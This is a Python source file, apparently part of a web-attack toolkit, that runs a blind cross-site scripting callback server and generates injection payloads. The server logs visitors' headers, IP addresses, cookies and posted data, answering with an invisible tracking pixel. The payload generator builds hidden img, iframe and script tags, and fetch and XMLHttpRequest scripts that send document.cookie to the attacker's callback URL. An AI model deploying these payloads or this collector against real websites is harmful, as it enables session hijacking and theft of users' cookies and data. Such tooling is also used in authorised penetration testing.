# blind_xss_server.py
import http.server
import socketserver
import threading
import json
import time
from datetime import datetime
import hashlib
import uuid
from typing import Dict

class BlindXSSHandler(http.server.SimpleHTTPRequestHandler):
    """Handler for receiving Blind XSS callbacks"""
    
    callbacks = []
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # Generate unique ID for tracking
        callback_id = hashlib.md5(f"{self.client_address}{time.time()}".encode()).hexdigest()[:8]
        
        callback_data = {
            'id': callback_id,
            'timestamp': datetime.now().isoformat(),
            'method': 'GET',
            'path': self.path,
            'headers': dict(self.headers),
            'client': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', 'Unknown')
        }
        
        self.__class__.callbacks.append(callback_data)
        
        # Return 1x1 pixel (invisible to user)
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
        print(f"[📡] Blind XSS callback received from {self.client_address[0]}")
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b''
        
        try:
            json_data = json.loads(post_data) if post_data else {}
        except:
            json_data = {'raw': post_data.decode('utf-8', errors='ignore')}
        
        callback_id = hashlib.md5(f"{self.client_address}{time.time()}".encode()).hexdigest()[:8]
        
        callback_data = {
            'id': callback_id,
            'timestamp': datetime.now().isoformat(),
            'method': 'POST',
            'path': self.path,
            'headers': dict(self.headers),
            'client': self.client_address[0],
            'data': json_data,
            'cookies': self.headers.get('Cookie', '')
        }
        
        self.__class__.callbacks.append(callback_data)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'ok', 'id': callback_id}).encode())
        print(f"[📡] Blind XSS POST callback received from {self.client_address[0]}")

class BlindXSSServer:
    """Server for receiving Blind XSS attacks"""
    
    def __init__(self, port: int = 8080):
        self.port = port
        self.server = None
        self.thread = None
        self.running = False
    
    def start(self):
        """Starts the server in a separate thread"""
        handler = BlindXSSHandler
        self.server = socketserver.TCPServer(("0.0.0.0", self.port), handler)
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        self.running = True
        print(f"[📡] Blind XSS server started on port {self.port}")
    
    def stop(self):
        """Stops the server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        self.running = False
        print("[📡] Blind XSS server stopped")
    
    def get_callbacks(self) -> list:
        """Returns all received callbacks"""
        return BlindXSSHandler.callbacks
    
    def generate_payloads(self, domain: str) -> Dict[str, str]:
        """Generates payloads for Blind XSS"""
        payloads = {}
        
        # Generate unique campaign ID
        campaign_id = str(uuid.uuid4())[:8]
        callback_url = f"http://{domain}:{self.port}/x/{campaign_id}"
        
        payloads['img'] = f'<img src="{callback_url}" style="display:none">'
        payloads['script'] = f'<script src="{callback_url}"></script>'
        payloads['iframe'] = f'<iframe src="{callback_url}" style="display:none"></iframe>'
        payloads['fetch'] = f'<script>fetch("{callback_url}?c="+document.cookie)</script>'
        payloads['xhr'] = f'<script>var x=new XMLHttpRequest();x.open("GET","{callback_url}?c="+document.cookie);x.send()</script>'
        
        return payloads